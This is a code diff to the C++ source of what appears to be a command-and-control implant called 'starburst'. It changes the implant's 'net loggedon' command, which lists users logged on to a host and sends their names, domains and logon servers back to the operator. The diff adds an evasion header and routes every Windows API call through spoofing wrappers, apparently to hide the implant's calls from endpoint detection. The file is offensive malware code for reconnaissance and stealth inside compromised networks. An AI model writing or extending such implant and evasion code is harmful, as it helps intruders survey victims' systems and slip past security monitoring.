@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_NET_LOGGEDON
 
@@ -27,7 +28,7 @@ auto declfn starburst::cmd_net_loggedon(
     _In_    Parser*   params
 ) -> void {
     STK_NETAPI32(_n);
-    auto h_netapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
+    auto h_netapi = reinterpret_cast<HMODULE>( SCALL( inst, kernel32.LoadLibraryA, _n ) );
     if ( !h_netapi ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "LoadLibrary netapi32 failed" ) ) );
@@ -54,7 +55,7 @@ auto declfn starburst::cmd_net_loggedon(
     if ( host_str && host_len > 0 ) {
         char host_buf[256] = { 0 };
         memory::copy( host_buf, host_str, host_len < 255 ? host_len : 255 );
-        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_buf, -1, w_host, 256 );
+        SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, host_buf, -1, w_host, 256 );
         p_host = w_host;
     }
 
@@ -62,7 +63,7 @@ auto declfn starburst::cmd_net_loggedon(
     DWORD entries_read = 0, total_entries = 0;
     DWORD resume = 0;
 
-    DWORD status = pNetWkstaUserEnum(
+    DWORD status = (DWORD)SCALL_PTR( inst, pNetWkstaUserEnum,
         p_host, 1, &buf, 0xFFFFFFFF,
         &entries_read, &total_entries, &resume );
 
@@ -75,7 +76,7 @@ auto declfn starburst::cmd_net_loggedon(
     uint32_t out_cap = 16384;
     auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
     if ( !output ) {
-        pNetApiBufferFree( buf );
+        SCALL_PTR( inst, pNetApiBufferFree, buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
@@ -91,7 +92,7 @@ auto declfn starburst::cmd_net_loggedon(
         // username
         if ( users[i].wkui1_username ) {
             char name[260] = { 0 };
-            inst.kernel32.WideCharToMultiByte( CP_ACP, 0, users[i].wkui1_username, -1, name, 260, nullptr, nullptr );
+            SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, users[i].wkui1_username, -1, name, 260, nullptr, nullptr );
             uint32_t nlen = str_len( name );
             memory::copy( output + off, name, nlen );
             off += nlen;
@@ -101,7 +102,7 @@ auto declfn starburst::cmd_net_loggedon(
         // domain
         if ( users[i].wkui1_logon_domain ) {
             char domain[260] = { 0 };
-            inst.kernel32.WideCharToMultiByte( CP_ACP, 0, users[i].wkui1_logon_domain, -1, domain, 260, nullptr, nullptr );
+            SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, users[i].wkui1_logon_domain, -1, domain, 260, nullptr, nullptr );
             uint32_t dlen = str_len( domain );
             memory::copy( output + off, domain, dlen );
             off += dlen;
@@ -111,7 +112,7 @@ auto declfn starburst::cmd_net_loggedon(
         // logon server
         if ( users[i].wkui1_logon_server ) {
             char server[260] = { 0 };
-            inst.kernel32.WideCharToMultiByte( CP_ACP, 0, users[i].wkui1_logon_server, -1, server, 260, nullptr, nullptr );
+            SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, users[i].wkui1_logon_server, -1, server, 260, nullptr, nullptr );
             uint32_t slen = str_len( server );
             memory::copy( output + off, server, slen );
             off += slen;
@@ -121,7 +122,7 @@ auto declfn starburst::cmd_net_loggedon(
     }
 
     output[off] = '\0';
-    pNetApiBufferFree( buf );
+    SCALL_PTR( inst, pNetApiBufferFree, buf );
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
     inst.heap_free( output );
 }
